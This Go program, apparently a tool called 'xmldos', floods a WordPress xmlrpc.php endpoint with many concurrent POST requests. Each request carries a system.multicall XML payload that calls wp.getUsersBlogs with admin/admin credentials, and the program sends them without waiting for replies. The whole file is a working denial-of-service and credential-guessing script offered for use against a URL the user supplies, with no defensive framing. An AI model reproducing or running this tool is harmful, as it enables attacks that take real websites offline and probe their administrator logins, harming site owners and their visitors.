package main

import (
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	urlPtr := flag.String("url", "", "vulnerable url (with /xmlrpc.php)")
	reqPtr := flag.Int("req", 100, "amount of requests (goroutines)")
	flag.Parse()
	if *urlPtr == "" {
		fmt.Println("Please specify a url!")
		fmt.Println("Usage: ./xmldos -url http://example.com/xmlrpc.php -req 100")
		os.Exit(1)
	}
	for i := 0; i < *reqPtr; i++ {
		go sendreq(*urlPtr, i)
	}
	fmt.Scanf("%s")
}

func sendreq(url string, threadnum int) {
	// Create new HTTP client
	client := http.Client{}

	// XML body
	body := `<?xml version="1.0" encoding="UTF-8"?>
  <methodCall>
    <methodName>system.multicall</methodName>
    <params>
      <param>
        <value><array><data>
          <value><struct>
            <member>
              <name>methodName</name>
              <value><string>wp.getUsersBlogs</string></value>
            </member>
            <member>
              <name>params</name>
              <value><array><data>
                <value><string>admin</string></value>
                <value><string>admin</string></value>
              </data></array></value>
            </member>
          </struct></value>
        </data></array></value>
      </param>
    </params>
  </methodCall>`

	// New Post request with XML body
	req, err := http.NewRequest("POST", url, strings.NewReader(body))
	if err != nil {
		panic(err)
	}
	fmt.Println("Request sent! Thread:", threadnum)
	// don't wait for response (fire and forget)
	client.Do(req)
	defer req.Body.Close()
}
